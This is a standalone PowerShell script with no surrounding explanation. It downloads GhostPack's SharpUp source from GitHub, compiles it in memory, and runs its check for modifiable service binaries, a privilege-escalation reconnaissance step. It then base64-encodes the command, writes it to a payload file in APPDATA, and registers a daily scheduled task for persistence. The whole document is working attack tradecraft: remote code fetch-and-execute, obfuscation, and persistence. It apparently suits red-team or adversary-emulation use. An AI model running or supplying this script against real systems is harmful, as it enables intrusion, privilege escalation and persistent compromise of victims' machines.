 $ps1 = @'
$id = Get-Random
$code = (iwr https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs -UseBasicParsing) -replace "class Program","public class Program$id"

$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp", "System.ServiceProcess", "System.Management")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
iex "[SharpUp.Program$id]::GetModifiableServiceBinaries()"
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($ps1)
$encodedCommand = [Convert]::ToBase64String($bytes)

$ps2 = "powershell -enc $encodedCommand | out-file $env:APPDATA\services.txt" | % { $_ | out-file $env:APPDATA\payload.ps1 }

$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command $env:APPDATA\payload.ps1"
$T = New-ScheduledTaskTrigger -Daily -At "00:01"
$P = New-ScheduledTaskPrincipal "$env:USERNAME"
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
Register-ScheduledTask T1 -InputObject $D -Force 
